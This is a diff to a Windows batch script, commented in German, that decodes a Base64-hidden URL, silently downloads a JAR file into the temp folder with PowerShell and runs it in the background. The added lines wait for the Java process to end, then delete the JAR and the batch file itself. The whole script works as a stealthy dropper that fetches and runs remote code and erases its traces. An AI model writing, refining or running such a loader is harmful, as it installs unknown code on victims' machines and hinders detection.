@@ -31,8 +31,20 @@ set "jarOutput=%TEMP%\Ja"v"a.jar"
 powershell -WindowStyle Hidden -Command "$jarUrl=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%encodedJarUrl%')); (New-Object System.Net.WebClient).DownloadFile($jarUrl, '%jarOutput%')"
 
 if exist "%jarOutput%" (
-    powershell -WindowStyle Hidden -Command "Start-Process 'java' -ArgumentList '-jar', '%jarOutput%' -WindowStyle Hidden"
+    start /b java -jar "%jarOutput%"
 )
 
+:wait_for_java
+REM Warte, bis der Java-Prozess, der die JAR-Datei ausführt, beendet ist
+tasklist /fi "imagename eq java.exe" | find /i "java.exe" >nul
+if %errorlevel% equ 0 (
+    timeout /t 2 /nobreak >nul
+    goto :wait_for_java
+)
+
+REM JAR-Datei löschen
+del "%jarOutput%"
+
+REM Batch-Datei löschen, nachdem der Java-Prozess beendet wurde
 start "" /b cmd /c del "%~f0" & exit
 exit
